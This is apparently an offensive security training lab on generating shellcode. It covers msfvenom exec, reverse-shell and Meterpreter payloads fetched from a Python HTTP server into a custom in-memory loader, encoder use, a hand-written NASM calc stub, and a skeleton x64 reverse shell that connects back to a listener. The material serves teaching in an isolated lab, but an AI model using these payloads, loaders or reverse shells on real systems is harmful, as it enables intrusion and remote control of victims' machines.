# Lab: Shellcode Generation - From Raw Bytes to Execution

## Overview

In the loader lab you built a vehicle. In this lab you focus on the fuel - **shellcode itself**: where it comes from, how it is generated, and what it looks like at the byte level. You will generate shellcode three different ways, load each one with your loader, and finish by writing a small x64 assembly stub by hand.

The theme throughout is the same as the workshop: coffee.

> ⚠️ **Warning:** Perform all work inside an isolated VM on a host-only network. Do not transfer payloads outside the lab environment.

---

## Prerequisites

| Requirement | Details |
|---|---|
| OS | Windows 10/11 x64 lab VM + Kali Linux VM (host-only network) |
| Tools (Windows) | Your compiled `loader.exe`, ThreatCheck, `C:\Lab-Artifacts\mimikatz.exe` |
| Tools (Kali) | `msfvenom`, Metasploit Framework, NASM (`sudo apt install nasm`) |
| Knowledge | Completed the loader lab - you need a working `loader.exe` |

---

## Lab Goals

- Understand the difference between generating shellcode from scratch vs. wrapping an existing PE
- Generate raw shellcode with msfvenom and execute it via your loader
- Generate shellcode from a Sliver implant and execute it via your loader
- Write a minimal x64 assembly stub by hand, assemble it, and run it
- Compare the three approaches across size, portability, and detection surface

---

## Background: Shellcode vs. PE Wrapping

Before writing any code, understand the two distinct workflows this lab covers:

### Path A - Generate shellcode from a C2 framework (msfvenom / Sliver)

The framework generates position-independent shellcode directly. There is no PE involved - the output is a raw `.bin` blob ready to be mapped and executed. This is the standard approach for reverse shells and C2 beacons.

```
msfvenom / Sliver → raw shellcode (.bin) → loader.exe → execution
```

### Path B - Convert an existing PE to shellcode (Donut)

You have an exe (Mimikatz, your own tool, anything). Donut wraps it into a self-contained shellcode blob that bootstraps a PE loader internally. The loader does not need to know or care that there is a PE inside.

```
mimikatz.exe → donut → shellcode (.bin) → loader.exe → execution
```

**Why does this distinction matter?**

msfvenom and Sliver cannot turn Mimikatz into shellcode - they only generate shellcode for their own payloads. Donut cannot generate a Meterpreter shell - it only wraps existing PEs. They solve different problems. Your loader works with both because it just maps and executes raw bytes regardless of what those bytes contain.

---

## Part 1: msfvenom - Generating Shellcode on Kali

### Background

msfvenom generates shellcode for Metasploit payloads. The two most important payload types are:

| Type | Example | How it works |
|---|---|---|
| **Stageless** | `windows/x64/shell_reverse_tcp` | The entire payload is in the shellcode blob - no second connection needed |
| **Staged** | `windows/x64/shell/reverse_tcp` | The shellcode is a small stub that connects back and downloads the real payload |

For this lab use **stageless** - your loader has no staging mechanism built in and a staged payload would connect back, download stage 2, and execute it in a context your loader does not manage cleanly.

### Step 1 - Generate Shellcode (Kali)

```bash
msfvenom -p windows/x64/exec CMD='cmd.exe /c start calc.exe' \
  -f raw \
  -o /Lab-Artifacts/Payloads/calc.bin
```

| Flag | Meaning |
|---|---|
| `-p` | Payload name |
| `CMD` | Command the exec payload runs |
| `-f raw` | Output as a raw binary blob (no PE wrapper) |
| `-o` | Output file path |

### Step 2 - Serve and Execute

Start a Python HTTP server from the payloads directory on Kali:

```bash
python3 -m http.server 8888 --directory /Lab-Artifacts/Payloads
```

Then on the Windows VM, pass the URL directly to your loader:

```cmd
loader.exe http://<KALI_IP>:8888/calc.bin
```

Calculator should launch. If it does not:

- Confirm the file was generated: `ls -lh /Lab-Artifacts/Payloads/calc.bin`
- Confirm the Python server is running and reachable from the Windows VM
- Check your loader's HTTP branch is working - test with a known-good payload from the loader lab

**Question:** Your loader fetched and executed the payload entirely from memory - the shellcode bytes never touched `C:\Lab-Artifacts\` on the Windows VM. What are the detection implications of this compared to writing the payload to disk first?

---

## Part 2: msfvenom - Reverse Shell

In Part 1 you used msfvenom's `exec` payload to run a command. Now you will generate a proper reverse shell - shellcode that calls back to your Kali machine and gives you an interactive shell session on the Windows VM.

### Background - Staged vs. Stageless (Revisited)

The `shell_reverse_tcp` payload comes in two forms - notice the slash difference:

| Payload | Type | Notes |
|---|---|---|
| `windows/x64/shell_reverse_tcp` | Stageless | Full shell in one blob - works with your loader as-is |
| `windows/x64/shell/reverse_tcp` | Staged | Small stager that downloads the real shell - does **not** work with your loader |

Always use the stageless form (`_reverse_tcp`, no slash before `reverse`) when loading with your own loader.

### Step 1 - Set Up a Listener (Kali)

Open a terminal on Kali and start a Metasploit listener:

```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD windows/x64/shell_reverse_tcp; \
  set LHOST <KALI_IP>; \
  set LPORT 4444; \
  run"
```

Leave this running - it will catch the connection when your loader executes the shellcode.

### Step 2 - Generate the Shellcode (Kali)

In a second terminal:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=<KALI_IP> \
  LPORT=4444 \
  -f raw \
  -o /Lab-Artifacts/Payloads/shell.bin
```

| Flag | Meaning |
|---|---|
| `-p` | Stageless reverse shell payload |
| `LHOST` | Your Kali IP - the address the shellcode calls back to |
| `LPORT` | Port your listener is waiting on |
| `-f raw` | Raw binary blob |
| `-o` | Output path |

If the Python HTTP server from Part 1 is still running, `shell.bin` is already being served. If not, restart it:

```bash
python3 -m http.server 8888 --directory /Lab-Artifacts/Payloads
```

### Step 3 - Execute via Your Loader

On the Windows VM:

```cmd
loader.exe http://<KALI_IP>:8888/shell.bin
```

Switch to your Kali listener - you should see an incoming connection and a shell prompt on the Windows VM.

### Step 4 - Confirm the Session

From the shell, confirm where you landed:

```cmd
whoami
hostname
```

**Question:** In Part 1 the payload ran calc.exe and the loader exited cleanly. With a reverse shell, `WaitForSingleObject(thread, INFINITE)` in your loader blocks until the shell session ends. What does this mean for the loader process on the target - and how might a defender use this to detect something unusual?

---

## Part 3: Write Shellcode by Hand

This section strips everything away. No framework, no PE. You will write x64 assembly on Kali that launches `calc.exe`, assemble it with NASM into a raw binary, serve it over HTTP, and execute it via your loader.

### Background - What Makes Shellcode Hard

Normal code relies on the OS loader to fix up addresses at load time. Shellcode has none of that - it is dropped at an arbitrary address with no imports, no relocations, and no known base. Every address it uses must be computed at runtime.

For a simple `WinExec` call there are two approaches:

- **Hardcode the address** - works only on a specific OS version/patch level, breaks everywhere else
- **Resolve it at runtime** - the same PEB walking technique your loader uses, but now written in assembly

For this beginner exercise you will use the hardcoded approach and note the limitation. The extension challenge asks you to replace it with runtime resolution.

### Step 1 - Find the WinExec Address (Windows VM)

You need the runtime address of `WinExec` on your target Windows VM. In PowerShell:

```powershell
$k32 = (Get-Process -Id $PID).Modules |
    Where-Object { $_.ModuleName -eq 'KERNEL32.DLL' } |
    Select-Object -ExpandProperty BaseAddress
"WinExec : 0x{0:X}" -f [System.Runtime.InteropServices.Marshal]::GetProcAddress($k32, "WinExec").ToInt64()
```

Or look it up directly in x64dbg: **Symbols tab → kernel32 → WinExec → note the address**.

Record the address - you will hardcode it in the next step. Keep in mind ASLR means this address changes on every reboot.

### Step 2 - Write the Assembly (Kali)

Create `/Lab-Artifacts/Payloads/calc_stub.asm`:

```nasm
; calc_stub.asm - x64 shellcode stub to launch calc.exe
; Assumes WinExec address is known (hardcoded - lab only)
; Calling convention: RCX = lpCmdLine, RDX = uCmdShow

BITS 64

    ; Align the stack to 16 bytes (required by x64 ABI)
    sub rsp, 28h

    ; Load pointer to "calc.exe" string (follows the code)
    lea rcx, [rel cmd]          ; RCX = pointer to "calc.exe\0"
    mov rdx, 1                  ; SW_SHOWNORMAL

    ; Call WinExec - replace 0x<ADDRESS> with your resolved address
    mov rax, 0x<ADDRESS>
    call rax

    ; Clean up and return
    add rsp, 28h
    ret

cmd:
    db "calc.exe", 0
```

Replace `0x<ADDRESS>` with the value you recorded in Step 1.

### Step 3 - Assemble (Kali)

```bash
nasm -f bin -o /Lab-Artifacts/Payloads/calc_stub.bin /Lab-Artifacts/Payloads/calc_stub.asm
```

`-f bin` produces a flat raw binary with no PE headers - exactly what your loader expects.

Confirm it assembled correctly:

```bash
ls -lh /Lab-Artifacts/Payloads/calc_stub.bin
```

### Step 4 - Serve and Execute

If the Python HTTP server is not already running:

```bash
python3 -m http.server 8888 --directory /Lab-Artifacts/Payloads
```

On the Windows VM:

```cmd
loader.exe http://<KALI_IP>:8888/calc_stub.bin
```

Calculator should open.

If it crashes (`0xC0000005` access violation):

- Verify the `WinExec` address is correct - ASLR means it changes on every reboot, so re-resolve it if you have rebooted since Step 1
- Check stack alignment - the `sub rsp, 28h` is required before any `call` in x64
- Confirm the binary assembled without errors and is non-zero in size

### Step 5 - Inspect the Bytes (Kali)

```bash
xxd /Lab-Artifacts/Payloads/calc_stub.bin
```

In the output, identify:

- The bytes for `sub rsp, 28h` - `48 83 ec 28`
- The bytes for `lea rcx, [rel cmd]` - the RIP-relative load
- The `mov rax, 0x...` encoding - your hardcoded address in little-endian
- The ASCII string `calc.exe` at the end

**Question:** Your assembly source is roughly 15 lines. The raw binary is probably under 40 bytes. Where did the rest go, and what does this tell you about the relationship between source code and shellcode size?

---

## ⭐ Bonus: Write a Reverse Shell by Hand

> **This is a bonus section.** Complete it only after finishing Parts 1–3. It is significantly harder than the calc stub - budget an hour or more and expect to debug carefully.

### Overview

The calc stub called a single API at a hardcoded address. A hand-written reverse shell is a step up in every dimension:

- You need to resolve multiple APIs at runtime via PEB walking - no hardcoded addresses
- You need to initialise Winsock, create a TCP socket, connect back to Kali, and redirect stdin/stdout/stderr to it
- All of this in position-independent x64 assembly with no CRT, no imports, no helpers

The APIs you need to resolve and call, in order:

| API | DLL | Purpose |
|---|---|---|
| `LoadLibraryA` | `kernel32.dll` | Load `ws2_32.dll` at runtime |
| `WSAStartup` | `ws2_32.dll` | Initialise Winsock |
| `WSASocketA` | `ws2_32.dll` | Create a TCP socket |
| `connect` | `ws2_32.dll` | Connect back to Kali |
| `CreateProcessA` | `kernel32.dll` | Spawn `cmd.exe` with handles redirected to the socket |

`ws2_32.dll` is not loaded by default - you need to call `LoadLibraryA` first to bring it in, then walk its export table for the Winsock APIs. This is exactly what your `loader.c` does with `wininet.dll` - same pattern, different DLL.

### Step 1 - Resolve the Addresses (Windows VM)

Since you will be doing PEB walking in assembly you do not need hardcoded addresses - but resolving them manually first lets you verify your logic is finding the right values.

In PowerShell:

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeLib {
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string name);
}
"@

$k32 = (Get-Process -Id $PID).Modules |
    Where-Object { $_.ModuleName -eq 'KERNEL32.DLL' } |
    Select-Object -ExpandProperty BaseAddress

foreach ($api in @("LoadLibraryA", "CreateProcessA")) {
    $addr = [System.Runtime.InteropServices.Marshal]::GetProcAddress($k32, $api)
    Write-Host "$api : 0x$($addr.ToString('X'))"
}

$ws2 = [NativeLib]::LoadLibrary("ws2_32.dll")
foreach ($api in @("WSAStartup", "WSASocketA", "connect")) {
    $addr = [NativeLib]::GetProcAddress($ws2, $api)
    Write-Host "$api : 0x$($addr.ToString('X'))"
}
```

Use these addresses to verify your PEB walking and export table logic produces matching values once you have it working in assembly.

### Step 2 - Write the Assembly (Kali)

Create `/Lab-Artifacts/Payloads/shell_stub.asm`. Work through it section by section - do not try to write it all at once.

```nasm
BITS 64

; -------------------------------------------------------
; Kali listener details - update before assembling
; sin_port = htons(4444) = 0x5C11
; sin_addr = Kali IP in network (big-endian) byte order
;   e.g. 192.168.1.10 = C0 A8 01 0A = 0x0A01A8C0
; -------------------------------------------------------
%define KALI_PORT  0x5C11
%define KALI_ADDR  0x<IP_HEX>

_start:
    sub rsp, 0D8h           ; shadow space + locals - keep 16-byte aligned

    ; -------------------------------------------------------
    ; 1. Find kernel32.dll base via PEB walking
    ;    GS:0x60 -> PEB -> LDR -> InMemoryOrderModuleList
    ;    kernel32 is consistently the 3rd entry on Win10/11
    ; -------------------------------------------------------
    mov  rax, gs:[0x60]         ; PEB
    mov  rax, [rax+0x18]        ; PEB_LDR_DATA
    mov  rax, [rax+0x20]        ; InMemoryOrderModuleList.Flink (1st - loader itself)
    mov  rax, [rax]             ; 2nd entry - ntdll
    mov  rax, [rax]             ; 3rd entry - kernel32
    mov  rbx, [rax+0x20]        ; DllBase of kernel32

    ; -------------------------------------------------------
    ; 2. Parse kernel32 export table to find LoadLibraryA
    ;    djb2 hash: 0x01ED9ADD (same as loader.c)
    ;    Implement findExp logic from loader.c here
    ;    Store result in r12
    ; -------------------------------------------------------

    ; -------------------------------------------------------
    ; 3. LoadLibraryA("ws2_32.dll")
    ; -------------------------------------------------------
    lea  rcx, [rel ws2_str]
    call r12                    ; LoadLibraryA
    mov  r13, rax               ; save ws2_32 base

    ; -------------------------------------------------------
    ; 4. Resolve WSAStartup, WSASocketA, connect from ws2_32
    ;    Walk r13's export table - same findExp logic
    ; -------------------------------------------------------

    ; -------------------------------------------------------
    ; 5. WSAStartup(0x0202, &wsadata)
    ; -------------------------------------------------------
    mov  rcx, 0x0202
    lea  rdx, [rsp+30h]
    call <WSAStartup>

    ; -------------------------------------------------------
    ; 6. WSASocketA(AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6, 0, 0, 0)
    ; -------------------------------------------------------
    mov  rcx, 2
    mov  rdx, 1
    mov  r8,  6
    xor  r9,  r9
    push 0
    push 0
    sub  rsp, 20h
    call <WSASocketA>
    add  rsp, 30h
    mov  r14, rax               ; save socket handle

    ; -------------------------------------------------------
    ; 7. Build sockaddr_in and connect()
    ;    Layout: WORD family, WORD port, DWORD addr, 8x zero
    ; -------------------------------------------------------
    sub  rsp, 20h
    mov  word  [rsp],   2
    mov  word  [rsp+2], KALI_PORT
    mov  dword [rsp+4], KALI_ADDR
    mov  qword [rsp+8], 0
    mov  rcx, r14
    lea  rdx, [rsp]
    mov  r8,  16
    call <connect>
    add  rsp, 20h

    ; -------------------------------------------------------
    ; 8. Resolve CreateProcessA from kernel32 (base in rbx)
    ; -------------------------------------------------------

    ; -------------------------------------------------------
    ; 9. Zero and populate STARTUPINFOA on the stack
    ;    cb=68, dwFlags=STARTF_USESTDHANDLES (0x100)
    ;    hStdInput/Output/Error = socket handle (r14)
    ; -------------------------------------------------------
    lea  rdi, [rsp+40h]
    xor  rax, rax
    mov  rcx, 9
    rep  stosq
    mov  dword [rsp+40h],     68
    mov  dword [rsp+40h+3Ch], 0x100
    mov  [rsp+40h+40h], r14
    mov  [rsp+40h+48h], r14
    mov  [rsp+40h+50h], r14

    ; -------------------------------------------------------
    ; 10. CreateProcessA(NULL, "cmd.exe", NULL, NULL,
    ;                    TRUE, 0, NULL, NULL, &si, &pi)
    ; -------------------------------------------------------
    xor  rcx, rcx
    lea  rdx, [rel cmdline]
    xor  r8,  r8
    xor  r9,  r9
    push 0
    push 0
    push 0
    push 1
    lea  rax, [rsp+40h+20h]
    push rax
    lea  rax, [rsp+20h]
    push rax
    sub  rsp, 20h
    call <CreateProcessA>
    add  rsp, 50h

wait:
    jmp wait

ws2_str:
    db "ws2_32.dll", 0
cmdline:
    db "cmd.exe", 0
```

> 📝 **This is a skeleton, not a complete solution.** The PEB walking and export table sections are marked with comments - implement them by translating the `findMod` and `findExp` logic from `loader.c` directly into assembly. The djb2 hashes you need are already defined in `loader.c`. Stack offsets in the `STARTUPINFOA` section will likely need adjustment - use x64dbg to step through and verify each call.

### Step 3 - Assemble and Deliver (Kali)

```bash
nasm -f bin -o /Lab-Artifacts/Payloads/shell_stub.bin /Lab-Artifacts/Payloads/shell_stub.asm
```

Start a netcat listener:

```bash
nc -lvnp 4444
```

On the Windows VM:

```cmd
loader.exe http://<KALI_IP>:8888/shell_stub.bin
```

### Debugging Tips

Hand-written shellcode at this level almost always requires several debug cycles. In x64dbg on the Windows VM:

- Set a hardware execute breakpoint on the RWX region returned by `VirtualAlloc` — `loader.exe` allocates memory as `PAGE_EXECUTE_READWRITE` directly, so execution transfers to the shellcode immediately after `CreateThread` without a `VirtualProtect` call
- Step through each API call and verify `RAX`: `WSASocketA` returns a valid socket handle, `connect` returns 0 on success
- If `connect` fails, inspect the `sockaddr_in` on the stack - family, port, and address must all be in network byte order (big-endian)
- If `CreateProcessA` fails, verify `STARTUPINFOA.cb` is exactly 68 and `dwFlags` has `STARTF_USESTDHANDLES` set

**Question:** Compare your hand-written reverse shell to the msfvenom `shell_reverse_tcp` output from Part 2 - in both size and structure. msfvenom's version is substantially larger. What do you think accounts for the difference?

---

## Part 4: Compare All Three Approaches

Fill in the table below based on your results:

| | msfvenom exec | msfvenom reverse shell | Hand-written |
|---|---|---|---|
| Approximate size | | | |
| Requires a listener | | | |
| Tied to a specific OS/patch level | | | |
| Suitable for PE payload delivery | | | |
| Gives interactive access | | | |

**Discussion questions:**

1. msfvenom and Donut both produce raw shellcode blobs - but they serve entirely different purposes. What is the fundamental thing Donut does that msfvenom cannot?
2. Your hand-written shellcode breaks on reboot because of ASLR. What technique would you use to make it position-independent?
3. The reverse shell payload is significantly larger than the exec payload. Where do those extra bytes come from - what is the shell doing that calc.exe is not?

---

## Extension Challenges

### Challenge 1 - Make the Assembly Stub Position-Independent

Rewrite `calc_stub.asm` to resolve `WinExec` at runtime using PEB walking and export table parsing - in assembly. No hardcoded addresses. This is significantly harder and will take time. Use your `loader.c` implementation as a reference for the algorithm; your task is to translate it to x64 assembly.

Resources:
- [Shell Storm shellcode database](http://shell-storm.org/shellcode/) - study existing PIC shellcode examples
- [x64 calling convention (Microsoft)](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention)

### Challenge 2 - Encode the msfvenom Payload

msfvenom supports encoders that transform the shellcode bytes. Try:

```bash
msfvenom -p windows/x64/exec CMD='cmd.exe /c start calc.exe' \
  -e x64/xor_dynamic \
  -i 3 \
  -f raw \
  -o /Lab-Artifacts/Payloads/calc_encoded.bin
```

Does the encoded payload still execute correctly via your loader?

```cmd
loader.exe http://<KALI_IP>:8888/calc_encoded.bin
```

Open both `/Lab-Artifacts/Payloads/calc.bin` and `/Lab-Artifacts/Payloads/calc_encoded.bin` in a hex editor on Kali and compare the byte patterns. What did the encoder actually do to the bytes, and why does the encoded version still work at runtime?

### Challenge 3 - Meterpreter Shell

Swap the reverse shell payload for a Meterpreter shell:

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=<KALI_IP> \
  LPORT=4444 \
  -f raw \
  -o /Lab-Artifacts/Payloads/meter.bin
```

Update your listener to `windows/x64/meterpreter_reverse_tcp` and execute via your loader:

```cmd
loader.exe http://<KALI_IP>:8888/meter.bin
```

Once the session opens, confirm it landed correctly:

```
whoami
sysinfo
```

---

## Resources

| Resource | Why It Matters |
|---|---|
| [msfvenom payload list](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom) | Full payload and format reference |
| [NASM documentation](https://www.nasm.us/doc/) | x64 assembly reference |
| [x64 ABI (Microsoft)](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention) | Calling convention - required for correct stack handling |
| [Shell Storm shellcode db](http://shell-storm.org/shellcode/) | Reference shellcode examples (study, don't copy) |
| [Maldev Academy](https://maldevacademy.com/) | Deeper shellcode development curriculum |

### Using AI for This Lab

| Good use | Avoid |
|---|---|
| "Explain what `sub rsp, 28h` does and why it's required before a call in x64" | "Write me x64 shellcode that launches calc.exe" |
| "Why does ASLR break hardcoded addresses and how does PIC shellcode solve it?" | "Debug my shellcode for me" |
| "What does the x64 red zone mean and does shellcode need to worry about it?" | - |
| "Explain the difference between staged and stageless payloads" | - |
